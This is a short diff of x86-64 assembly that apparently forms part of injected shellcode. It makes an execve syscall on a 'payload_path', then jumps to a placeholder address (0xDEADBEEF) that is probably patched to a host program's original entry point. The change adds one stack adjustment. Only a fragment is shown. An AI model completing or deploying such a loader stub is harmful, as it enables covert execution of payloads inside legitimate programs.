@@ -15,6 +15,7 @@ path:
 	mov al, 59
 	syscall
 parent:
+	add rsp, 0x10
 	add rbx, 0xDEADBEEF
 	jmp rbx
 payload_path:
